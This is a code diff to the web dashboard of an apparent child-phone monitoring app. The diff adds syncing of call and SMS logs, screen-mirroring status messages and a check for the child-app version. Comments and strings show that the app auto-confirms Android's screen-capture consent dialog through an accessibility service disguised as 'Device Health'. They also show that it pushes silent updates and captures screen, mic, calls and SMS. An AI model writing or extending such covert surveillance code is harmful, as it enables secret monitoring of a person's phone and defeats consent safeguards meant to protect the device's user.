@@ -578,7 +578,21 @@ function handleWs(m) {
     case "command_result": {
       if (m.cid !== S.cid) break;
       const d = m.data || {};
-      if (m.ok && d.url) {
+      if (m.ok && d.status === "synced") {
+        // "Sync now" ka INLINE result — real counts + current permission flags.
+        // Perm flags YAHIN update karo: warna 60 s tak purani (galat) state
+        // dikhti aur diag banner permission ON hone ke baad bhi Off dikhata.
+        const c = activeChild();
+        if (c && typeof d.permCalls === "boolean") c.permCalls = d.permCalls;
+        if (c && typeof d.permSms === "boolean") c.permSms = d.permSms;
+        loadLogs();
+        permDiag();
+        if (d.permCalls === false || d.permSms === false) {
+          toast("Permission abhi bhi OFF hai — upar ⚠️ diag me exact fix padho");
+        } else {
+          toast((d.calls || 0) + " calls · " + (d.sms || 0) + " SMS synced ✓");
+        }
+      } else if (m.ok && d.url) {
         $("media-card").classList.remove("hidden");
         $("media-img").src = S.origin + d.url;
         toast("Capture mil gaya ✓ (Live tab dekho)");
@@ -609,7 +623,9 @@ function handleWs(m) {
           mirrorStatus("Bachche ki screen mirroring chalu ho gayi ✓", false);
         } else if (S.mirrorOn) {
           setMirrorBtn(true);
-          mirrorStatus("Consent dialog auto-confirm ho raha hai… (5–20 sec)", true);
+          // Child se HONEST reason aaye (consent fail / a11y off / OEM block) to
+          // generic "consent confirm ho raha hai" ki jagah wahi dikhao.
+          mirrorStatus(m.reason || "Consent dialog auto-confirm ho raha hai… (5–20 sec)", true);
         } else {
           setMirrorBtn(false);
           mirrorStatus("", false);
@@ -1320,7 +1336,8 @@ async function loadLogs() {
 }
 function syncLogsNow() {
   sendCmd("sync_usage");
-  toast("Bachche ke phone se sync shuru — 3–5 sec me data aa jayega");
+  toast("Bachche ke phone se sync shuru — result aate hi counts dikhenge");
+  // Backup reloads (agar command_result WS se na aaye — purana child build):
   [3000, 6000, 12000].forEach((ms) => setTimeout(() => { if (!$("tab-report").classList.contains("hidden")) loadLogs(); }, ms));
 }
 $("logs-sync").onclick = syncLogsNow;
@@ -1334,8 +1351,8 @@ function renderLiveDiag() {
   const h = c.health || {};
   const issues = [];
   // #1 PURANA APK — mirror/mic fixes phone tak pahunche hi nahi
-  if (typeof h.versionCode === "number" && h.versionCode < 2) {
-    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v2) — Android 14/15 mirror+mic fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
+  if (typeof h.versionCode === "number" && h.versionCode < 3) {
+    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v3) — Android 14/15 mirror+mic+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
   }
   if (h.accessibility === false) {
     issues.push("<b>Accessibility OFF hai</b> — consent dialog aur updates ka auto-confirm kaam nahi karega. <b>Fix:</b> Settings → Accessibility → Device Health → ON. Android 13+ par pehle App info → ⋮ → “Allow restricted settings” karna pad sakta hai.");
